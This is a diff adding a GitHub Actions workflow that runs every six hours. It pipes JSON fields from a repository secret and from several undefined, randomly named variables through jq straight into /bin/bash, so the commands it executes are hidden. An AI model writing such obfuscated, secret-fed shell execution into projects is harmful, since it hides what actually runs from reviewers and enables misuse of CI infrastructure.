@@ -1,0 +1,24 @@
+name: shuangrizoubo
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shuangrizoubo
+        env:
+          o55494: ${{ secrets.o55494 }}
+        run: |
+          echo $o55494 | jq -r .utmu9 | /bin/bash
+          echo $s3 | jq -r .xt477 | /bin/bash
+          echo $zou84259 | jq -r .xpm34372 | /bin/bash
+          echo $ezp6 | jq -r .jdgqr695 | /bin/bash
+          echo $ahn9530 | jq -r .qcv14 | /bin/bash
+          echo $inwsl0438 | jq -r .c77274 | /bin/bash
+          echo $fw5 | jq -r .t372 | /bin/bash
+          echo $golo39201 | jq -r .b704 | /bin/bash
+
